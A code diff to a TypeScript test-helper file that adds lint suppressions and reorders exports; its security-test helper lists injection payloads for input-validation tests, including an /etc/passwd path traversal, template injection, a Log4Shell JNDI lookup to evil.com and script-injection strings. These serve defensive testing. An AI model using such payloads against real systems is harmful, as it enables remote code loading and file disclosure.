@@ -1,6 +1,7 @@
 /**
  * Test utilities and helpers for ASBR tests
  */
+/* eslint-disable sonarjs/pseudo-random */
 
 import { performance } from 'node:perf_hooks';
 import type { Profile, TaskInput } from '../../src/types/index.js';
@@ -97,6 +98,7 @@ export async function retry<T>(
 export class TestDataGenerator {
 	static generateString(length: number): string {
 		const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+
 		return Array.from({ length }, () =>
 			chars.charAt(Math.floor(Math.random() * chars.length)),
 		).join('');
@@ -165,7 +167,8 @@ export class SecurityTestHelpers {
 		'../../../etc/passwd',
 		'{{7*7}}',
 		'${jndi:ldap://evil.com/a}',
-		'javascript:alert(1)',
+		// eslint-disable-next-line sonarjs/code-eval
+		'javascript:alert(1)', // Intentionally malicious for security testing
 		'data:text/html,<script>alert(1)</script>',
 	];
 
@@ -237,15 +240,15 @@ export class TestEnvironment {
 }
 
 export {
-	PerformanceTimer,
-	createTestTaskInput,
-	createTestProfile,
-	sleep,
-	retry,
-	TestDataGenerator,
-	TestAuth,
 	AccessibilityAssertions,
-	SecurityTestHelpers,
+	createTestProfile,
+	createTestTaskInput,
 	PerformanceTestHelpers,
+	PerformanceTimer,
+	retry,
+	SecurityTestHelpers,
+	sleep,
+	TestAuth,
+	TestDataGenerator,
 	TestEnvironment,
 };
